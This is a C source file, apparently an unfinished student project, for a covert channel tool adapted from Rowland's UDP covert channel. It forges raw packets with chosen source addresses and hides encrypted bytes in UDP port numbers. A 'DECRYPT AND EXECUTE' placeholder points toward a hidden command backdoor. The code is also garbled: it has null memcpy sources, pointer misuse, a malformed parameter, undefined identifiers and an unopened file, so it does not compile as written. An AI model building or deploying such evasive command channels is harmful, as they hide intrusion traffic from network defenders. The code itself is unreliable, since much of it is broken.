/*---------------------------------------------------------------------------------------
 * SOURCE FILE:	    covert_udp
 * 
 * PROGRAM:		    covert_udp
 * 
 * FUNCTIONS:		void forgepacket(unsigned int, unsigned int, unsigned short, unsigned short, char *, int, int);
 *                  void client(unsigned int source_addr, unsigned int dest_addr, unsigned short source_port, unsigned short dest_port, char *filename, int ipid);
 *                  void server(unsigned int source_addr, unsigned short source_port, unsigned short dest_port, char *filename, int ipid);
 *                  int charToInt(char msg);
 *                  unsigned short in_cksum(unsigned short *, int);
 *                  unsigned int host_convert(char *);
 *                  void usage(char *);
 * 
 * DATE:			September 20, 2021
 * 
 * REVISIONS:		NA
 * 
 * DESIGNERS:       Nicole Jingco
 * 
 * PROGRAMMERS:		Nicole Jingco
 * 
 * Notes:
 * This application is a modification of the Craig H. Rowland UDP Covert Channel. This 
 * program modifies the UDP header to transfer a file one byte at a time  to the destination
 * host consealing the data in the port number. This program acts as both a server and 
 * client.
 * 
 * Functions Modified:
 * - forgepacket: changed it to only check if it will be running client or server
 * - client: moved client functionality to this function
 * - server: moved server functionality to this function
 * 
 * Compile:
 * cc -o covert_udp covert_udp.c
 * 
 * Client
 * ./covert_udp -dest 192.168.1.72 -source 192.168.1.71 -source_port 323 -dest_port 323 -file sample.txt
 * 
 * Server
 * ./covert_udp -dest 192.168.1.71 -source 192.168.1.72 -source_port 323 -dest_port 323 -file test.txt -server
 * ---------------------------------------------------------------------------------------*/
#include "covert_udp.h"
#include "crypto.h"

/*--------------------------------------------------------------------------
 * FUNCTION:        forgepacket
 *
 * DATE:           NA
 *
 * REVISIONS:      NA
 * 
 * DESIGNER:       Nicole Jingco
 *
 * PROGRAMMER:     Nicole Jingco
 *
 * INTERFACE:      unsigned int source_addr, unsigned int dest_addr, unsigned short source_port, unsigned short dest_port, char *filename, int server, int ipid, int seq, int ack
 *
 * RETURNS:        
 *
 * NOTES:
 * This section runs client or the server code if server flag was set
 * -----------------------------------------------------------------------*/
void forgepacket(unsigned int source_addr, unsigned int dest_addr, unsigned short source_port, unsigned short dest_port, int svr, int ipid, int seed)
{
    if (svr == 0)
    {
        client(source_addr, dest_addr, source_port, dest_port, ipid);
        fprintf(stdout, "\nPackets Sent\n\n");
    }
    else
    {
        server(source_addr, source_port, dest_port, ipid);
        fprintf(stdout, "\nData Received\n\n");
    }
}

/*--------------------------------------------------------------------------
 * FUNCTION:       client
 *
 * DATE:           Sep 20, 2021
 *
 * REVISIONS:      NA
 * 
 * DESIGNER:       Nicole Jingco
 *
 * PROGRAMMER:     Nicole Jingco
 *
 * INTERFACE:      unsigned int source_addr, unsigned int dest_addr, unsigned short dest_port, char *filename, int ipid
 *
 * RETURNS:        NA
 *
 * NOTES:
 * Client function for consealing the message using the UDP header and
 * hiding the message in the port number
 * -----------------------------------------------------------------------*/
void client(unsigned int source_addr, unsigned int dest_addr, unsigned short source_port, unsigned short dest_port, int ipid)
{
    int ch;
    int send_socket;
    struct sockaddr_in *sin;
    struct send_udp *send_udp;
    FILE *input;
    int isReading = 1;

    // GET COMMAND INPUT
    char *commandBuffer[BUFF_SIZE];
    memcpy(commandBuffer, 0, BUFF_SIZE);

    // ENCRYPT DATA
    char *command = (char *)malloc(BUFF_SIZE);
    unsigned char ciphertext[BUFF_SIZE];

    int ciphertext_len = encrypt((unsigned char *)command, BUFF_SIZE, KEY, IV, ciphertext);
    unsigned int *cypher_len = htonl(ciphertext_len);
    memcpy(commandBuffer, &cypher_len, ENC_LEN);
    memcpy((commandBuffer + ENC_LEN), &cypher_len, BUFF_SIZE);

    for (int i = 0; i < (ciphertext_len + ENC_LEN); i++)
    {
        /* Delay loop. This really slows things down, but is necessary to ensure */
        /* semi-reliable transport of messages over the Internet and will not flood */
        /* slow network connections */
        /* A better should probably be developed */
        sleep(1);

        /* Make the IP header with our forged information */
        send_udp.ip.ihl = 5;
        send_udp.ip.version = 4;
        send_udp.ip.tos = 0;
        send_udp.ip.tot_len = htons(28);

        /* if we are NOT doing IP ID header encoding, randomize the value */
        /* of the IP identification field */
        if (ipid == 0)
            send_udp.ip.id = (int)(255.0 * rand() / (RAND_MAX + 1.0));

        send_udp.ip.frag_off = 0;
        send_udp.ip.ttl = 64;
        send_udp.ip.protocol = IPPROTO_UDP;
        send_udp.ip.check = 0;
        send_udp.ip.saddr = source_addr;
        send_udp.ip.daddr = dest_addr;
        send_udp.udp.len = htons(8);

        /* forge destination port */
        send_udp.udp.dest = htons(dest_port);

        // HIDE HERE
        send_udp.udp.source = (htons(ch + commandBuffer[i]));

        /* Drop our forged data into the socket struct */
        sin.sin_family = AF_INET;
        sin.sin_port = send_udp.udp.source;
        sin.sin_addr.s_addr = send_udp.ip.daddr;

        /* Now open the raw socket for sending */
        send_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (send_socket < 0)
        {
            perror("send socket cannot be open. Are you root?");
            exit(1);
        }

        /* Make IP header checksum */
        send_udp.ip.check = in_cksum((unsigned short *)&send_udp.ip, 20);
        /* Final preparation of the full header */

        /* From synhose.c by knight */
        pseudo_header.source_address = send_udp.ip.saddr;
        pseudo_header.dest_address = send_udp.ip.daddr;
        pseudo_header.placeholder = 0;
        pseudo_header.protocol = IPPROTO_UDP;
        pseudo_header.udp_length = htons(8);

        bcopy((char *)&send_udp.udp, (char *)&pseudo_header.udp, 8);

        /* Final checksum on the entire package */
        send_udp.udp.check = in_cksum((unsigned short *)&pseudo_header, 32);

        /* Away we go.... */
        sendto(send_socket, &send_udp, 28, 0, (struct sockaddr *)&sin, sizeof(sin));
        printf("Sending Data: %c\n", ch);

        close(send_socket);
    }

    fclose(input);
}

/*--------------------------------------------------------------------------
 * FUNCTION:       server
 *
 * DATE:           Sep 20, 2021
 *
 * REVISIONS:      NA
 * 
 * DESIGNER:       Nicole Jingco
 *
 * PROGRAMMER:     Nicole Jingco
 *
 * INTERFACE:      unsigned int source_addr, char *filename, int ipid
 *
 * RETURNS:        NA
 *
 * NOTES:
 * Server function for unvealing the message from the UDP header and
 * writing the the message to a file.
 * -----------------------------------------------------------------------*/
void server(unsigned int source_addr, unsigned short source_port, unsigned short dest_port, c int ipid)
{
    FILE *output;
    int recv_socket;
    struct recv_udp recv_packet;
    char *commandBuffer[BUFF_SIZE + ENC_LEN + BUFF_EXTRA];
    char cypher_size[ENC_LEN];
    int dp = 0;
    int buff_len = 0;
    unsigned int size;

    while (1) /* read packet loop */
    {
        /* Open socket for reading */
        recv_socket = socket(AF_INET, SOCK_RAW, 17);

        if (recv_socket < 0)
        {
            perror("receive socket cannot be open. Are you root?");
            exit(1);
        }
        /* Listen for return packet on a passive socket */
        read(recv_socket, (struct recv_udp *)&recv_packet, 9999);

        // corect dp and correct flag
        if ((dp = ntohs(recv_packet.udp.dest)) == dest_port)
        {
            if (buff_len < ENC_LEN)
            {
                cypher_size[SIZE COUNTER] = dp;
            }
            else if (buff_len == ENC_LEN)
            {
                memcpy(&size, &charSize, 4);
                size = htonl(size);
            }
            else
            {
                if (dp != 0)
                {
                    commandBuffer[buff_len] = (char)dp;
                }
                else
                {
                    // DECRYPT AND EXECUTE
                }
            }

            buff_len++;
        }

        close(recv_socket); /* close the socket so we don't hose the kernel */
    }

    fclose(output);
}

/*--------------------------------------------------------------------------
 * FUNCTION:       in_cksum
 *
 * DATE:           NA
 *
 * REVISIONS:      NA
 * 
 * DESIGNER:       Craig H. Rowland
 *
 * PROGRAMMER:     Craig H. Rowland
 *
 * INTERFACE:      unsigned short *ptr, int nbytes
 *
 * RETURNS:        
 *
 * NOTES:
 * This is the main file that takes the user input then continues to the
 * read file
 * -----------------------------------------------------------------------*/
unsigned short in_cksum(unsigned short *ptr, int nbytes)
{
    register long sum; /* assumes long == 32 bits */
    u_short oddbyte;
    register u_short answer; /* assumes u_short == 16 bits */

    /*
	 * Our algorithm is simple, using a 32-bit accumulator (sum),
	 * we add sequential 16-bit words to it, and at the end, fold back
	 * all the carry bits from the top 16 bits into the lower 16 bits.
	 */

    sum = 0;
    while (nbytes > 1)
    {
        sum += *ptr++;
        nbytes -= 2;
    }

    /* mop up an odd byte, if necessary */
    if (nbytes == 1)
    {
        oddbyte = 0;                            /* make sure top half is zero */
        *((u_char *)&oddbyte) = *(u_char *)ptr; /* one byte only */
        sum += oddbyte;
    }

    /*
	 * Add back carry outs from top 16 bits to low 16 bits.
	 */

    sum = (sum >> 16) + (sum & 0xffff); /* add high-16 to low-16 */
    sum += (sum >> 16);                 /* add carry */
    answer = ~sum;                      /* ones-complement, then truncate to 16 bits */
    return (answer);
}

/*--------------------------------------------------------------------------
 * FUNCTION:       host_convert
 *
 * DATE:           NA
 *
 * REVISIONS:      NA
 * 
 * DESIGNER:       Craig H. Rowland
 *
 * PROGRAMMER:     Craig H. Rowland
 *
 * INTERFACE:      char *hostname
 *
 * RETURNS:        
 *
 * NOTES:
 * This is the main file that takes the user input then continues to the
 * read file
 * -----------------------------------------------------------------------*/
unsigned int host_convert(char *hostname)
{
    static struct in_addr i;
    struct hostent *h;
    i.s_addr = inet_addr(hostname);
    if (i.s_addr == -1)
    {
        h = gethostbyname(hostname);
        if (h == NULL)
        {
            fprintf(stderr, "cannot resolve %s\n", hostname);
            exit(0);
        }
        bcopy(h->h_addr, (char *)&i.s_addr, h->h_length);
    }
    return i.s_addr;
}
